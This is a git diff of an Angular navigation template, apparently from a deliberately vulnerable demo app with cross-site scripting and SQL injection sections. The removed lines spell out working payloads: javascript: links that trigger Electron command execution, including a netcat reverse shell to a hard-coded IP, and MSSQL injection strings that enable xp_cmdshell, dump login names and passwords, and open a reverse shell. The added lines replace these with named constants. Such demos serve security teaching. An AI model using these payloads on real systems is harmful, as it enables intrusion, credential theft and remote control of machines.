@@ -4,28 +4,16 @@
         <input id="nav-xss" type="checkbox" />
         <label for="nav-xss">Cross-Site Scripting</label>
         <ul class="nav-list">
-            <li><a class="nav-link" routerLink="/xss/breadcrumbs">Breadcrumbs</a></li>
-            <li><a class="nav-link" routerLink="/xss/breadcrumbs/<a href='javascript:alert(%22Uh oh... 😢%22)'>Breadcrumbs 2">Breadcrumbs XSS</a></li>
-            <li *ngIf="electronService.isElectron()">
-                <a class="nav-link" routerLink="/xss/breadcrumbs/<a href='javascript:require(%22child_process%22).exec(%22dir%22, function (e,r) { alert(r)})'>Electron RCE - dir"
-                    >Electron RCE - dir</a
-                >
-            </li>
-            <li *ngIf="electronService.isElectron()">
-                <a
-                    class="nav-link"
-                    routerLink="/xss/breadcrumbs/<a href='javascript:require(%22child_process%22).exec(%22nc.exe 172.25.85.72 11235 -e cmd.exe%22, function (e,r) { alert(r)})'>Electron Shell - shell"
-                    >Electron RCE - shell</a
-                >
-            </li>
-            <li *ngIf="electronService.isElectron()">
-                <a
-                    class="nav-link"
-                    routerLink="/xss/breadcrumbs/<a href='javascript:require(%22child_process%22).exec(%22nc.exe 172.25.85.72 11235 -e cmd.exe%22, function (e,r) { alert(r)})'>Electron Shell - shell"
-                    >Electron RCE - shell</a
-                >
-            </li>
+            <li><a class="nav-link" [routerLink]="ROUTE_BREADCRUMBS">Breadcrumbs</a></li>
+            <li><a class="nav-link" [routerLink]="ROUTE_BREADCRUMBS_XSS">Breadcrumbs XSS</a></li>
+            <li><a class="nav-link" routerLink="/xss/forms">Form</a></li>
             <li><a class="nav-link" routerLink="/xss/markdown">Markdown</a></li>
+
+            <!-- electron only exploits-->
+            <ng-container *ngIf="electronService.isElectron()">
+                <li><a class="nav-link" [routerLink]="ROUTE_BREADCRUMBS_RCE_ELECTRON_DIR">Electron RCE - dir</a></li>
+                <li><a class="nav-link" [routerLink]="ROUTE_BREADCRUMBS_RCE_ELECTRON_SHELL">Electron RCE - shell</a></li>
+            </ng-container>
         </ul>
     </section>
 
@@ -34,18 +22,18 @@
         <input id="nav-xss" type="checkbox" />
         <label for="nav-xss">SQL Injection</label>
         <ul class="nav-list">
-            <li><a class="nav-link" routerLink="/sqli/easy">Easy</a></li>
-            <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\' OR 1=1 --' }">Easy - 101</a></li>
-            <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\' UNION SELECT @@VERSION,2,3,4,5,6 --' }">Easy - SQL Version</a></li>
-            <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\' UNION SELECT name,2,password,HOST_NAME(),5,DB_NAME() FROM master..syslogins --' }">Easy - Accounts</a></li>
-            <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC sp_configure \'show advanced options\', 1;--' }">Easy - Get Shell 1</a></li>
-            <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; RECONFIGURE;--' }">Easy - Get Shell 2</a></li>
-            <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC sp_configure \'xp_cmdshell\', 1;--' }">Easy - Get Shell 3</a></li>
-            <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; RECONFIGURE;--' }">Easy - Get Shell 4</a></li>
-            <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC xp_cmdshell \'whoami\';--' }">Easy - whoami</a></li>
-            <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC xp_cmdshell \'ipconfig\';--' }">Easy - ipconfig</a></li>
-            <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC xp_cmdshell \'set\';--' }">Easy - set</a></li>
-            <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC xp_cmdshell \'nc <IP> <PORT> -e cmd.exe\';--' }">Easy - Reverse TCP Shell</a></li>
+            <li><a class="nav-link" [routerLink]="ROUTE_SQLI_EASY">Easy</a></li>
+            <li><a class="nav-link" [routerLink]="ROUTE_SQLI_EASY" [queryParams]="SQLI_USER_101">Easy - 101</a></li>
+            <li><a class="nav-link" [routerLink]="ROUTE_SQLI_EASY" [queryParams]="SQLI_USER_VERSION">Easy - SQL Version</a></li>
+            <li><a class="nav-link" [routerLink]="ROUTE_SQLI_EASY" [queryParams]="SQLI_USER_ACCOUNTS">Easy - Accounts</a></li>
+            <li><a class="nav-link" [routerLink]="ROUTE_SQLI_EASY" [queryParams]="SQLI_USER_SHELL_SHOW_ADVANCED">Easy - Get Shell 1</a></li>
+            <li><a class="nav-link" [routerLink]="ROUTE_SQLI_EASY" [queryParams]="SQLI_USER_SHELL_RECONFIGURE">Easy - Get Shell 2</a></li>
+            <li><a class="nav-link" [routerLink]="ROUTE_SQLI_EASY" [queryParams]="SQLI_USER_XP_CMDSHELL">Easy - Get Shell 3</a></li>
+            <li><a class="nav-link" [routerLink]="ROUTE_SQLI_EASY" [queryParams]="SQLI_USER_SHELL_RECONFIGURE">Easy - Get Shell 4</a></li>
+            <li><a class="nav-link" [routerLink]="ROUTE_SQLI_EASY" [queryParams]="SQLI_USER_XP_CMDSHELL_WHOAMI">Easy - whoami</a></li>
+            <li><a class="nav-link" [routerLink]="ROUTE_SQLI_EASY" [queryParams]="SQLI_USER_XP_CMDSHELL_IPCONFIG">Easy - ipconfig</a></li>
+            <li><a class="nav-link" [routerLink]="ROUTE_SQLI_EASY" [queryParams]="SQLI_USER_XP_CMDSHELL_SET">Easy - set</a></li>
+            <li><a class="nav-link" [routerLink]="ROUTE_SQLI_EASY" [queryParams]="SQLI_USER_XP_CMDSHELL_SHELL">Easy - Reverse TCP Shell</a></li>
         </ul>
     </section>
 </section>
